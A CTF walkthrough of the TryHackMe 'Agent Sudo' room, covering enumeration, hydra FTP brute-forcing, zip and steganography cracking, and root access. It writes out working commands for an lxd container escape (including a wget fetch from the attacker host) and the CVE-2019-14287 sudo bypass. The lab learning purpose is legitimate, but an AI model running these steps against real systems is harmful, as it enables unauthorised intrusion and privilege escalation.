---
tags: foremost, lxd, stegseek, sudo
---
# Tryhackme: Agent Sudo

***Overview**: AgentSudo is a Linux machine rated easy on Tryhackme, this machine exploits sensitive data exposure to gain credentials for foothold and then also exploits multiple escalation vectors like `lxd` and the `sudo` version to gain root.*
- so going to the page i am presented with a message

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027094839.png)

- then i go ahead to scan for directories using `nmap -sV -sC -T4 -A -p- 10.10.47.253`

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027100657.png)

- i also scan for directories using `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://192.168.55.111/FUZZ`

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027100729.png)

- then from the clue gotten from the default page, I intercepted the request using burp and modified the user agent to C, then viewing the responce i got the directory in the location header

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027105649.png)

- going there i discover another message, and i got the name of one of the agents as as Chris

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027105958.png)

- since from the nmap scan i saw an ftp server open, i decided to bruteforce it with the name found (the message says the password is weak) `hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.47.253 ftp` and then i got the password as crystal

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027111626.png)

- so logging in to the ftp server, i retrieved the files stored and viewed them

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027112512.png)

- so viewing the message i was able to get another hint and 2 image files

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027112831.png)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027112911.png)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027112935.png)

- I view the images using exiftool 

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027113046.png)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027113109.png)

- then i extracted the content of the cutie image file using foremost`foremost cutie.png`, you can also use binwalk with `binwalk --dd='.*' cutie.png`

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027113841.png)

- so i got a zip file after the extraction

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027113945.png)

- i tried extracting it but it required a password

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027114027.png)

- so i converted the zip file into a hash using zip2john `zip2john 00000067.zip > hashes ` and then i cracked it using johntheripper `john --wordlist=/usr/share/wordlists/rockyou.txt hashes` and got the password as alien

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027114701.png)

- so i extracted the file and got another message with another image

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027114911.png)

- then i cracked cracked the image file using stegseek  `stegseek cute-alien.jpg ` and found another message in the file

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027115330.png)

- viewing the message extracted, i got a password and also a name

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027115429.png)

- from the nmap scan, I know that ssh is open so i logged in with the possible credentials found and i got access, then i found another image file and the first flag

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027115834.png)

- i got the image file on my attack machine and did some reverse image search with google images

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027120422.png)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027120434.png)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027120459.png)

- then i found a page and got the title of that page

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027121217.png)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027121112.png)

#### Privilege Escalation
- so i checked for some privilege escalation vectors and running the id command i saw that james user was part of the lxd group

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027210846.png)

- so on my attack machine, i ran the following commands
```text
- git clone  https://github.com/saghul/lxd-alpine-builder.git
- sudo ./build-alpine
- python3 -m http.server 80 # to host the file
```
- then on the vulnerable machine i get the file and run the remaining commands
```text
- wget http://192.168.49.166/alpine-v3.13-x86_64-20210218_0139.tar.gz
- lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
- lxc image list
- lxd init
- lxc init myimage ignite -c security.privileged=true
- lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
- lxc start ignite
- lxc exec ignite /bin/sh
```
- And then i got root access and also got the root flag

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027205531.png)

- to answer the question of the CVE, i checked for the sudo version using `sudo -V | grep "Sudo ver"`

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027220010.png)

- and then checking for exploits to that specific version i got it was vulnerable to  [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287) and also found the exploit at [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027221006.png)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027221037.png)

- so running the command `sudo -u#-1 /bin/bash` and entered james password  and also got root access and the root flag as well

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027220839.png)

![](/assets/Agent%20Sudo_assets/Pasted%20image%2020221027221128.png)
 
 I'm done guys, thanks for reading my writeup, see you next time :)
